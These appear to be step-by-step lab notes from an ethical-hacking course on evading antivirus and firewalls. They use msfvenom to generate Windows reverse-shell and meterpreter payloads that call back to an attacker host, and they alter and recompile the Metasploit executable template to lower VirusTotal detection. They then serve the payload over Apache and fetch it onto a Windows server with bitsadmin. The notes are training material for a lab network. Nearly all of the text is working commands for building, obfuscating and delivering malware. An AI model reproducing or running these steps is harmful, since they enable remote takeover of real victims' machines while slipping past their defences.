
**Lab 2: Evade Firewalls using Various Evasion Techniques**
**Task 3: Bypass Antivirus using Metasploit Templates**

	[parrot]
		sudo su
		msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Windows.exe
	
	Firefox
	
		https://www.virustotal.com
		upload file and check for virus
		54/70 - virus detected
	
	Terminal
	
	pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c
	template.c file appears, change the payload size from 4096 to 4000, save the file
	cd /usr/share/metasploit-framework/data/templates/src/pe/exe/ 
	i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
	ls

New Terminal
generate a payload using new template

	msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > 
	/home/attacker/bypass.exe

https://www.virustotal.com
upload file and check for virus
48 out of 71 antivirus vendors have detected the malicious file

---------------------------------
Task 4: Bypass Firewall through Windows BITSAdmin

	[Win 2019]	 
	control panel -> System and Security  ->Windows Defender Firewall ->Turn Windows Defender Firewall on or off ->Customize Settings  -> Turn on Windows Defender Firewall under Private network settings and Public network settings.

	[parrot]

	sudo su
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe 
	start apache & share

	[win 2019]
	launch powershell
	bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
	c:\ -> check if file is transferred or not? [files are case sensitive]

attacker can use this malicious file for gaining access, escalating privileges and to perform various malicious other activities.